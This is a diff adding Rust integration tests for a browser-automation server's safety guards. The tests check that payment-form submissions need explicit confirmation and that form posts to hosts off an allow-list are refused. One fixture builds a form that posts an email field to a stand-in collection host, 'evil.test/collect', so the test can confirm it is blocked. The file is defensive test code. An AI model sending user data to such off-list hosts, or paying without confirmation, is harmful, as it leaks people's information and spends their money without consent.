@@ -278,3 +278,251 @@ fn a_download_on_a_second_tab_reaches_that_tab() {
     let _ = child.wait();
     let _ = std::fs::remove_dir_all(&profile);
 }
+
+/// Enter in a field submits its form: observe records the form's submit
+/// button ("Pay $18") and the guard refuses the ticketed Enter until the
+/// call confirms that label; a field in no form takes Enter as before.
+#[test]
+#[ignore = "needs a local Chrome"]
+fn enter_in_a_form_that_submits_with_pay_needs_confirm() {
+    let (mut child, profile, browser) = launch();
+    let mut server = Server::with_pipe(browser)
+        .with_policy(ultra_instinct_mcp::Policy::from_lists("", "Pay*").unwrap());
+    call(
+        &mut server,
+        "browser_navigate",
+        json!({"url": "data:text/html,<title>pay</title><form onsubmit=\"document.title='paid';return false\">\
+<label>Promo code <input id=c></label><button>Pay $18</button></form>\
+<label>Search <input id=s></label>"}),
+    );
+    let state = call(&mut server, "browser_get_state", json!({"format": "json"}));
+    let enter = |index: u64| json!({"index": index, "key": "Enter", "snapshot": state["snapshot"]});
+    let err = server
+        .call_tool("browser_send_key", &enter(index_of(&state, "Promo code")))
+        .expect_err("needs confirm");
+    assert_eq!(
+        err,
+        ToolError::NeedsConfirm {
+            label: "Pay $18".into()
+        }
+    );
+    call(
+        &mut server,
+        "browser_send_key",
+        enter(index_of(&state, "Search")),
+    );
+    let title = call(
+        &mut server,
+        "browser_exec",
+        json!({"expression": "document.title"}),
+    );
+    assert_eq!(title["result"], "pay", "nothing submitted: {title}");
+    let mut confirmed = enter(index_of(&state, "Promo code"));
+    confirmed["confirm"] = json!("Pay $18");
+    call(&mut server, "browser_send_key", confirmed);
+    let title = call(
+        &mut server,
+        "browser_exec",
+        json!({"expression": "document.title"}),
+    );
+    assert_eq!(title["result"], "paid", "{title}");
+    println!("pipe live: Enter in the Pay form needed its confirm");
+    drop(server);
+    let _ = child.wait();
+    let _ = std::fs::remove_dir_all(&profile);
+}
+
+/// The submit label is the button's accessible name (`aria-labelledby`
+/// first, as the click check reads it), and a form with no submit button
+/// still submits on Enter when at most one field blocks implicit
+/// submission; with two such fields Enter submits nothing.
+#[test]
+#[ignore = "needs a local Chrome"]
+fn implicit_submission_and_labelledby_submit_buttons_need_confirm() {
+    let (mut child, profile, browser) = launch();
+    let mut server = Server::with_pipe(browser)
+        .with_policy(ultra_instinct_mcp::Policy::from_lists("", "Pay*").unwrap());
+    call(
+        &mut server,
+        "browser_navigate",
+        json!({"url": "data:text/html,<title>forms</title>\
+<form onsubmit=\"document.title='sent';return false\"><label>Coupon <input></label>\
+<button aria-labelledby=x>Continue</button><span id=x>Pay $18</span></form>\
+<form onsubmit=\"document.title='sent';return false\"><label>Gift card <input></label></form>\
+<form onsubmit=\"document.title='sent';return false\"><label>First <input></label><label>Last <input></label></form>"}),
+    );
+    let state = call(&mut server, "browser_get_state", json!({"format": "json"}));
+    let enter = |label: &str| json!({"index": index_of(&state, label), "key": "Enter", "snapshot": state["snapshot"]});
+    // The click check would name the same button by the same label.
+    let pay = &state["elements"][index_of(&state, "Pay $18") as usize - 1];
+    assert_eq!(pay["role"], "button", "{state}");
+    for (field, label) in [("Coupon", "Pay $18"), ("Gift card", "(form submit)")] {
+        let err = server
+            .call_tool("browser_send_key", &enter(field))
+            .expect_err(field);
+        assert_eq!(
+            err,
+            ToolError::NeedsConfirm {
+                label: label.into()
+            },
+            "{field}"
+        );
+    }
+    call(&mut server, "browser_send_key", enter("First"));
+    let title = call(
+        &mut server,
+        "browser_exec",
+        json!({"expression": "document.title"}),
+    );
+    assert_eq!(title["result"], "forms", "nothing submitted: {title}");
+    println!("pipe live: labelledby submit and implicit submission need confirm");
+    drop(server);
+    let _ = child.wait();
+    let _ = std::fs::remove_dir_all(&profile);
+}
+
+/// Index-less Enter carries "\r", so a focused field's form submits; Enter
+/// on a checkbox in a Pay form is checked against the form's Pay button; a
+/// nameless (icon-only) submit button is an unknown submission.
+#[test]
+#[ignore = "needs a local Chrome"]
+fn enter_submits_from_fields_and_boxes_under_the_form_rule() {
+    let (mut child, profile, browser) = launch();
+    let mut server = Server::with_pipe(browser);
+    let form = |id: &str, inner: &str| {
+        format!("<form onsubmit=\"document.title+='{id}';return false\">{inner}</form>")
+    };
+    let url = format!(
+        "data:text/html,<title>t</title>{}{}{}",
+        form("A", "<label>Search <input></label><button>Go</button>"),
+        form(
+            "B",
+            "<label><input type=checkbox> Accept terms</label><button>Pay $18</button>"
+        ),
+        form(
+            "C",
+            "<label>Code <input></label><button><svg width=12 height=12></svg></button>"
+        ),
+    );
+    call(&mut server, "browser_navigate", json!({ "url": url }));
+    let state = call(&mut server, "browser_get_state", json!({"format": "json"}));
+    let at = |label: &str| json!({"index": index_of(&state, label), "snapshot": state["snapshot"]});
+    let title = |server: &mut Server| {
+        call(
+            server,
+            "browser_exec",
+            json!({"expression": "document.title"}),
+        )["result"]
+            .clone()
+    };
+    call(&mut server, "browser_focus", at("Search"));
+    call(&mut server, "browser_send_key", json!({"key": "Enter"}));
+    assert_eq!(
+        title(&mut server),
+        "tA",
+        "index-less Enter submits the form"
+    );
+    call(&mut server, "browser_focus", at("Accept terms"));
+    call(&mut server, "browser_send_key", json!({"key": "Enter"}));
+    let from_box = title(&mut server);
+    // Chrome submits a form on Enter from a checkbox (as from a field).
+    assert_eq!(from_box, "tAB", "Enter on a checkbox submits its form");
+    println!("pipe live: Enter on a checkbox submits its form");
+
+    server.set_policy(ultra_instinct_mcp::Policy::from_lists("", "Pay*").unwrap());
+    call(&mut server, "browser_focus", at("Accept terms"));
+    let err = server
+        .call_tool("browser_send_key", &json!({"key": "Enter"}))
+        .expect_err("Enter on the box submits the Pay form");
+    assert_eq!(
+        err,
+        ToolError::NeedsConfirm {
+            label: "Pay $18".into()
+        }
+    );
+    let mut code = at("Code");
+    code["key"] = json!("Enter");
+    let err = server
+        .call_tool("browser_send_key", &code)
+        .expect_err("a nameless submit button");
+    assert_eq!(
+        err,
+        ToolError::NeedsConfirm {
+            label: "(form submit)".into()
+        }
+    );
+    assert_eq!(title(&mut server), from_box, "nothing more submitted");
+    drop(server);
+    let _ = child.wait();
+    let _ = std::fs::remove_dir_all(&profile);
+}
+
+/// A form that posts to a host off the allow-list refuses the Enter or the
+/// click that would submit it, naming that host; a control whose content
+/// box is empty (all padding) still carries its form, so Enter in it needs
+/// the Pay button's confirm.
+#[test]
+#[ignore = "needs a local Chrome"]
+fn form_targets_and_empty_content_boxes_are_checked() {
+    let (mut child, profile, browser) = launch();
+    let mut server = Server::with_pipe(browser);
+    let url = "data:text/html,<title>t</title>\
+<form action='https://evil.test/collect' onsubmit=\"document.title+='E';return false\">\
+<label>Email <input></label><button>Join</button></form>\
+<form onsubmit=\"document.title+='P';return false\">\
+<label>Code <input style='width:0;padding:8px 60px'></label><button>Pay $18</button></form>";
+    call(&mut server, "browser_navigate", json!({ "url": url }));
+    let state = call(&mut server, "browser_get_state", json!({"format": "json"}));
+    let press = |label: &str, key: Option<&str>| {
+        let mut args = json!({"index": index_of(&state, label), "snapshot": state["snapshot"]});
+        if let Some(key) = key {
+            args["key"] = json!(key);
+        }
+        args
+    };
+    server.set_policy(ultra_instinct_mcp::Policy::from_lists("shop.example", "").unwrap());
+    let evil = ToolError::DomainNotAllowed {
+        host: "evil.test".into(),
+    };
+    let err = server
+        .call_tool("browser_send_key", &press("Email", Some("Enter")))
+        .expect_err("Enter posts to evil.test");
+    assert_eq!(err, evil);
+    let err = server
+        .call_tool("browser_click", &press("Join", None))
+        .expect_err("Join posts to evil.test");
+    assert_eq!(err, evil);
+    server.set_policy(ultra_instinct_mcp::Policy::from_lists("", "Pay*").unwrap());
+    // The padded field is no region of its own; focused, an Enter into it
+    // still needs a confirm (its focus is not one observe names).
+    assert!(state["elements"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .all(|e| e["label"] != "Code"));
+    call(
+        &mut server,
+        "browser_exec",
+        json!({"expression": "document.querySelectorAll('input')[1].focus()"}),
+    );
+    let err = server
+        .call_tool("browser_send_key", &json!({"key": "Enter"}))
+        .expect_err("the padded field is in the Pay form");
+    println!("pipe live: Enter in the padded field: {err:?}");
+    assert_eq!(
+        err,
+        ToolError::NeedsConfirm {
+            label: "(unobserved focus)".into()
+        }
+    );
+    let title = call(
+        &mut server,
+        "browser_exec",
+        json!({"expression": "document.title"}),
+    );
+    assert_eq!(title["result"], "t", "nothing submitted: {title}");
+    println!("pipe live: off-list form target and empty content box refused");
+    drop(server);
+    let _ = child.wait();
+    let _ = std::fs::remove_dir_all(&profile);
+}
